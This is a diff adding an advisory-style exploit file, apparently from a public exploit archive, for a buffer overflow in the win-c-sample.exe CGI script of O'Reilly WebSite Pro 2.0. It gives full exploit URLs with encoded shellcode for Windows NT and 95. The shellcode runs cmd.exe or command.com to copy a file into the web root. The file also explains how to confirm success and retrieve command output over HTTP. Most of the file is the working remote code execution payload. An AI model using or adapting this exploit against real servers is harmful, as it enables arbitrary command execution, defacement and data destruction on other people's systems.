@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/2078/info
+
+O'Reilly WebSite (Pro) is a Windows 95/NT Web Server package. Versions 2.0 and below contained a vulnerable sample script, win-c-sample.exe, placed by default in /cgi-shl/ off the web root directory. This program is vulnerable to a buffer overflow, allowing for execution of arbitrary commands on the host machine with the privileges of the web server. Consequences of successful exploitation could range from destruction of data and web site defacement to elevation of privileges through locally exploitable vulnerabilities. 
+
+Windows NT (versions unspecified):
+http://website.host/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C6Lj%01V%8A
+%06<_u%03%80.?FAI%84%C0u%F0h0%10%F0wYhM\y[X%050PzPA9%01u%F0%83%E9%10%
+FF%D1h0%10%F0wYh%D0PvLX%0500vPA9%01u%F0%83%E9%1C%FF%D1cmd.exe_/c_copy
+_\WebSite\readme.1st_\WebSite\htdocs\x1.htm
+
+Windows 95:
+http://website.host/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C62j%01V%8A
+%06<_u%03%80.?FAI%84%C0u%F0%BAto|_%B9t`}`%03%CA%FF%D1%BAX_|_%B9XP|`%0
+3%CA%FF%D1c:\command.com_/c_copy_\WebSite\readme.1st_\WebSite\htdocsx1.htm
+
+The example dos commands just copy the WebSite's readme.1st file, so you
+can later check if the exploit worked by trying http://website.host/x1.htm.
+Note that the server should respond to these exploits with an "Error: no
+blank line separating header and data", because of the "1 file(s) copied"
+message appearing without a blank line before it (which is required for
+HTTP; if you need a command's output, you can redirect it to a file, and
+get that file via HTTP with a separate request). 
